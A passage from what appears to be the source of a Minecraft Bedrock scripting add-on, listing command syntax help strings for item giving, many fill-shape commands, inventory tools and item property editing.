    "give": `${command.dp}give <item: itemType> <amount: int>`,
    "giveb": `${command.dp}giveb <item: itemType> <stackSize: int(1-255)>`,
    "givec": `${command.dp}givec <itemJSON: itemJSON>
simplified itemJSON format (type "${command.dp}help itemJSONFormat" to see full format options): 
{
    "name"?: string,
    "lore"?: string[],
    "count"?: number,
    "keepondeath"?: boolean,
    "lockmode"?: ItemLockMode,
    "canplaceon"?: string[],
    "components"?: {
        "enchantable"?: {
            "add"?: Enchantment|Enchantment[],
            "addList"?: Enchantment[],
            "remove"?: Enchantment,
            "removeEnchantments"?: Enchantment,
            "clear"?: any
        },
        "durability"?: {
            "durability"?: number,
            "damage"?: number,
            "repair"?: number,
            "setDurabilityToMax"?: any
        },
        "damage"?: {
            "durability"?: number,
            "damage"?: number,
            "repair"?: number,
            "setDurabilityToMax"?: any
        }
    },
    force?: boolean
    source?: {
        type?: string,
        targetSelector?: string,
        targetSelectorExecutionLocation?: DimensionLocation,
        targetSelectorSourceEntity?: Entity,
        player?: string,
        entityAtBlock?: DimensionLocation,
        entityType?: string,
        entityTypeId?: string,
        entityId?: string|number,
        block?: DimensionLocation,
        slot?: number,
        id?: string,
        itemId?: string,
        count?: number,
        amount?: number
    },
    type?: string,
    dynamicproperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    cleardynamicproperties?: any,
    removedynamicproperties?: string[],
    removedynamicproperty?: string
}
examples: 
stack of 255 sharpness 1 wooden swords: {"minecraft:components": {"enchantable": {"add": {"level": 1, "type": "sharpness"}}}, "id": "wooden_sword", "count": 255}
sharpness 5 fortune 3 efficiency 5 iron axe that cannot be dropped and are kept on death with the name "§4Storage Hog Axe§r" and the lore "§eTakes\\nUp\\nYour\\nInventory§r" (with the \\n as line break characters) that says lol in the chat and damages the user when used: {"minecraft:components": {"enchantable": {"add": [{"level": 1, "type": "sharpness"}, {"type": "fortune", "level": 3}, {"type": "efficiency", "level": 5}]}}, "id": "iron_axe", "count": 72, "keepondeath": true, "lockMode": "inventory", "name": "§r§4Storage Hog Axe§r§f", "lore": ["§r§eTakes\\nUp§r§f","§r§eYour\\nInventory§r§f"], "dynamicProperties": {"code": "world.sendMessage('lol'); event.source.runCommandAsync(\\"/damage @s 1 thorns entity @s\\")"}}
stack of 16 unbreaking 3 mending 1 shields that are locked to a specific slot and are kept on death: {"minecraft:components": {"enchantable": {"addList": [{"level": 1, "type": "mending"}, {"type": "unbreaking", "level": 3}]}}, "id": "shield", "count": 16, "keepondeath": true, "lockMode": "slot"}`,
    "getuuid": `${command.dp}getuuid <target: target>`,
    "gma": `${command.dp}gma`,
    "gmc": `${command.dp}gmc`,
    "gmd": `${command.dp}gmd`,
    "gmp": `${command.dp}gmp`,
    "gmr": `${command.dp}gmr`,
    "gms": `${command.dp}gms`,
    "h#": `${command.dp}h<presetId: float> <containerRow: float>`,
    "hset": `${command.dp}hset <presetID: flaot> [dimensionId: string] [x: float] [y: float] [z: float]`,
    "idtfill": `${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> clear [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> drain
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> hollowovoid [clearContainers: boolean]`,
    "ifill": `${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> clear [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> drain
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}ifill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [clearContainers: boolean]`,
    "ifillb": `${command.dp}ifillb <from: x y z> <to: x y z> <tileName: Block> [blockStates: block states] [replaceTileName: Block] [replaceBlockStates: block states]\n${command.dp}ifillb <from: x y z> <to: x y z> <tileName: Block> <replaceTileName: Block> [replaceBlockStates: block states]`,
    "ifillc": `${command.dp}ifillc <from: x y z> <to: x y z> <tileName: Block> [blockStates: block states] [replaceTileName: Block] [replaceBlockStates: block states]\n${command.dp}ifillc <from: x y z> <to: x y z> <tileName: Block> <replaceTileName: Block> [replaceBlockStates: block states]`,
    "igfill": `${command.dp}igfill <from: x y z> <to: x y z> <tileName: Block> [blockStates: block states] [replaceTileName: Block] [replaceBlockStates: block states]\n${command.dp}igfill <from: x y z> <to: x y z> <tileName: Block> <replaceTileName: Block> [replaceBlockStates: block states]`,
    "invfillillegal": `${command.dp}fillillegal [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]`,
    "invfill": `${command.dp}fillinventory <itemJSON: itemJSON> [stackCount: int|fill|replaceall|replacefill] [target: string|~]`,
    "invfilljunk": `${command.dp}filljunk [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]`,
    "invfillop": `${command.dp}fillop [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]`,
    "invfillrandom": `${command.dp}fillrandom [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]`,
    "invsee": `${command.dp}invsee <playerTarget: targetSelector>`,
    "invseep": `${command.dp}invseep <playerTarget: targetSelector>`,
    "invseeuuidmode": `${command.dp}invseeuuidmode <entityUUID: int>`,
    "invshuffle": `${command.dp}invshuffle <playerTarget: targetSelector>`,
    "invswap": `${command.dp}invswap [player: targetSelector|~] [otherPlayer: targetSelector|~]`,
    "invswapb": `${command.dp}invswapb [player: playerName|~] [otherPlayer: playerName|~]`,
    "iogfill": `${command.dp}iogfill <from: x y z> <to: x y z> <tileName: Block> [blockStates: block states] [replaceTileName: Block] [replaceBlockStates: block states]\n${command.dp}iogfill <from: x y z> <to: x y z> <tileName: Block> <replaceTileName: Block> [replaceBlockStates: block states]`,
    "item": `${command.dp}item <mode: lore|lorene> <lore: JSON>
${command.dp}item <mode: canplaceon|candestroy> <blockTypes: string[]>
${command.dp}item name <name: text>
${command.dp}item count <count: int(1-255)>
${command.dp}item <mode: json|jsonb> <itemJSON: ItemJSON>
${command.dp}item property removelist <propertyIdList: string[]>
${command.dp}item property setlist <propertyList: JSON>
${command.dp}item property <mode: remove|get> <propertyId: string>
${command.dp}item property setnumber <propertyId: string> <propertyValue: number>
${command.dp}item property setstring <propertyId: string> <propertyValue: string>
${command.dp}item property setboolean <propertyId: string> <propertyValue: boolean>
${command.dp}item property setvector3 <propertyId: string> <propertyValue: Vector3>
${command.dp}item property <mode: list|clear>
${command.dp}item enchantment add <enchantment: {"level": number, "type": string}>
${command.dp}item enchantment addlist <enchantment: {"level": number, "type": string}[]>
${command.dp}item enchantment <mode: remove|get|testfor> <enchantmentId: string>
${command.dp}item enchantment <mode: list|clear>
${command.dp}item slot <slot: int> <mode: lore|lorene> <lore: JSON>
${command.dp}item slot <slot: int> name <name: text>
${command.dp}item slot <slot: int> count <count: int(1-255)>
${command.dp}item slot <slot: int> <mode: json|jsonb> <itemJSON: ItemJSON>
${command.dp}item slot <slot: int> property removelist <propertyIdList: string[]>
${command.dp}item slot <slot: int> property setlist <propertyList: JSON>
${command.dp}item slot <slot: int> property <mode: remove|get> <propertyId: string>
${command.dp}item slot <slot: int> property setnumber <propertyId: string> <propertyValue: number>
${command.dp}item slot <slot: int> property setstring <propertyId: string> <propertyValue: string>
${command.dp}item slot <slot: int> property setboolean <propertyId: string> <propertyValue: boolean>
${command.dp}item slot <slot: int> property setvector3 <propertyId: string> <propertyValue: Vector3>
${command.dp}item slot <slot: int> property <mode: list|clear>
${command.dp}item slot <slot: int> enchantment add <enchantment: {"level": number, "type": string}>
${command.dp}item slot <slot: int> enchantment addlist <enchantment: {"level": number, "type": string}[]>
${command.dp}item slot <slot: int> enchantment <mode: remove|get|testfor> <enchantmentId: string>
${command.dp}item slot <slot: int> enchantment <mode: list|clear>`,
    "itfill": `${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
